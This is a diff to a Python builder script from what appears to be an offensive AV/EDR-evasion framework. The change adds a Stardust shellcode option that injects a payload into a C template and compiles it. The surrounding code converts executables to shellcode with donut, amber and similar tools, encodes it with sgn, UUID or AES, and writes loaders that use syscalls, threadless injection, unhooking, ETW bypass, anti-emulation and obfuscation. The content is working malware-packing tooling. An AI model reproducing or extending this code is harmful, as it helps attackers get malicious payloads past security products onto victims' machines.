@@ -14,6 +14,7 @@ import random
 import string
 import time
 import glob
+import sys
 
 def check_non_negative(value):
     ivalue = int(value)
@@ -25,26 +26,92 @@ def generate_random_filename(length=6):
     # Generate a random string of fixed length 
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, encoding=None):
-    # Generate the initial shellcode .bin file
-    if shellcode_type == 'donut':
-        cmd = ['./PIC/donut', '-b1', '-f1', '-i', input_exe, '-o', output_path + ".bin"]
-    elif shellcode_type == 'pe2sh':
-        cmd = ['wine', './PIC/pe2shc.exe', input_exe, output_path + ".bin"]
-    elif shellcode_type == 'rc4':
-        cmd = ['wine', './PIC/rc4_x64.exe', input_exe, output_path + ".bin", '-r']
-        if subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
-            # If rc4_x64.exe fails, try with rc4_x86.exe for 32-bit payloads
-            cmd = ['wine', '/PIC/rc4_x86.exe', input_exe, output_path + ".bin", '-r']
-    elif shellcode_type == 'amber':
-        a_number = random.randint(1, 30)  
-        # print(f"Encoding number: {a_number}")
-        cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
-    else:
-        raise ValueError("Unsupported shellcode type.")
+## .bin input file
+def handle_star_dust(input_file):
+    if not input_file.endswith('.bin'):
+        print("Warning, Stardust needs a binary shellcode file .bin as input")
+        # Exit the program if the input file is not a .bin file
+        sys.exit(1)
+    print(f"[!] Using Stardust to generate shellcode from binary file: {input_file}")
+    # Run bin_to_c_array.py to convert .bin to C array and save it to ./shellcode.txt
+    subprocess.run(['python3', 'encoders/bin_to_c_array.py', input_file, './shellcode.txt'], check=True)
 
-    # Run the initial shellcode generation command
-    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # Read the generated ./shellcode.txt to find the shellcode
+    with open('./shellcode.txt', 'r') as file:
+        content = file.read()
+
+    # Find the position of "unsigned char buf[] ="
+    start = content.find('unsigned char buf[] =')
+    if start == -1:
+        print("Error: 'unsigned char buf[] =' not found in shellcode.txt")
+        return
+
+    start += len('unsigned char buf[] =')
+    end = content.find(';', start)
+    shellcode = content[start:end].strip()
+
+    ## Make a copy of Stardust/src/Main.c
+    # subprocess.run(['cp', 'Stardust/src/Main.c', 'Stardust/src/Main.c.bak'], check=True)
+    subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)
+
+    # Replace the placeholder ####MAGICSPELL#### in Stardust/src/Main.c
+    stardust_main_path = 'Stardust/src/Main.c'
+    with open(stardust_main_path, 'r') as file:
+        main_content = file.read()
+
+    if '####MAGICSPELL####' not in main_content:
+        print("Error: '####MAGICSPELL####' placeholder not found in Stardust/src/Main.c")
+        return
+
+    main_content = main_content.replace('####MAGICSPELL####', shellcode)
+
+    # Write the updated content back to Stardust/src/Main.c
+    with open(stardust_main_path, 'w') as file:
+        file.write(main_content)
+
+    
+    # Run `make` command in the /Stardust directory
+    subprocess.run(['make', '-C', './Stardust'], check=True)
+
+    #
+    # Copy the generated boaz.x64.bin to the current directory
+    subprocess.run(['cp', 'Stardust/bin/boaz.x64.bin', '.'], check=True)
+    # remove ./shellcode.txt after usage:
+    subprocess.run(['rm', './shellcode.txt'], check=True)   
+    # copy the original backup file back to Stardust/src/Main.c
+    # subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)
+
+
+
+def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, encoding=None, star_dust=False):
+    if not star_dust:
+        # Generate the initial shellcode .bin file
+        if shellcode_type == 'donut':
+            cmd = ['./PIC/donut', '-b1', '-f1', '-i', input_exe, '-o', output_path + ".bin"]
+        elif shellcode_type == 'pe2sh':
+            cmd = ['wine', './PIC/pe2shc.exe', input_exe, output_path + ".bin"]
+        elif shellcode_type == 'rc4':
+            cmd = ['wine', './PIC/rc4_x64.exe', input_exe, output_path + ".bin", '-r']
+            if subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
+                # If rc4_x64.exe fails, try with rc4_x86.exe for 32-bit payloads
+                cmd = ['wine', '/PIC/rc4_x86.exe', input_exe, output_path + ".bin", '-r']
+        elif shellcode_type == 'amber':
+            a_number = random.randint(1, 30)  
+            # print(f"Encoding number: {a_number}")
+            cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
+        else:
+            raise ValueError("Unsupported shellcode type.")
+
+        # Run the initial shellcode generation command
+        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # print the shellcode type used:
+        print(f"[+] Shellcode type used: {shellcode_type}")
+    
+    elif star_dust:
+        output_path = input_exe
+    # print output_path
+    print(f"[+] Shellcode saved to: {output_path}")
+    ### TODO: add support for stardust option: 
 
     # If encode flag is True, use sgn to encode the shellcode
     if encode:
@@ -84,6 +151,7 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
         subprocess.run(' '.join(cmd), shell=True, check=True)
         output_path = encoding_output_path   
+        print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
     else:
         # Process the .bin file to a C char array if not using UUID
         process_cmd = ['python3', './encoders/bin_to_c_array.py', output_path_bin, output_path]
@@ -162,7 +230,7 @@ def insert_junk_api_calls(content, junk_api, main_func_pattern):
 
 
 # def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
-def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False):
+def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False):
 
     # Adjust loader_template_path for DLL
     if compile_as_dll:
@@ -199,8 +267,10 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
                 content = content[:next_line_start] + sweet_sleep_call + content[next_line_start:]
 
     if (encoding is not None):
-
-        encoded_output_path = f'note_{shellcode_type}'  #
+        if not star_dust:
+            encoded_output_path = f'note_{shellcode_type}'  #
+        elif star_dust:
+            encoded_output_path = f'boaz.x64'  #
         ## TODO: Add support for other encoding types
         if encoding == 'uuid':
             include_header = '#include "uuid_converter.h"\n'
@@ -801,7 +871,7 @@ def main():
 
     # Extended description for loaders
     loaders_description = """
-    12 loaders:
+    loader modules:
     1.  Custom Stack syscalls with threadless execution (local injection)
     2.  APC test alert
     3.  Sifu syscall
@@ -879,6 +949,9 @@ def main():
     parser.add_argument('-g', '--god-speed', action='store_true', help='Enable advanced unhooking technique Peruns Fart (God Speed)')
 
     parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4', 'amber'], help='Shellcode generation tool: donut (default), pe2sh, rc4, or amber')
+    parser.add_argument('-sd', '--star_dust', action='store_true', help='Enable Stardust PIC generator, input should be .bin')
+
+
     parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')
 
     ## TODO: Add support for other encoding types
@@ -915,12 +988,21 @@ def main():
         shellcode_file = 'note_donut'
 
 
-    generate_shellcode(args.input_file, shellcode_file, args.shellcode_type, args.encode_sgn, args.encoding)
+    if args.star_dust:
+        handle_star_dust(args.input_file)
+        # Change input file to the generated boaz.x64.bin for further processing
+        args.input_file = 'boaz.x64'
 
+    generate_shellcode(args.input_file, shellcode_file, args.shellcode_type, args.encode_sgn, args.encoding, args.star_dust)
+    if args.star_dust:
+        shellcode_file = f'boaz.x64'
     shellcode = read_shellcode(shellcode_file)
+    # print shellcode_file
+    # print(f"[!]  Shellcode file: {shellcode_file}")
+
     template_loader_path = f'loaders/loader_template_{args.loader}.c' if args.loader != 1 else 'loaders/loader1.c'
     output_loader_path = f'loaders/loader{args.loader}_modified.c' if args.loader != 1 else 'loaders/loader1_modified.c'
-
+    
     ### Deal with syswhisper option:
     # Determine if SysWhisper-specific handling is required
     use_syswhisper = args.syswhisper is not None or args.loader == 15
@@ -957,7 +1039,7 @@ def main():
     ##print the args.encoding:
     # print(f"using encoding option: {args.encoding}")
     # write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding)
-    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl)
+    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust)
 
     if args.obfuscate:
         print("Obfuscating the loader code...\n")
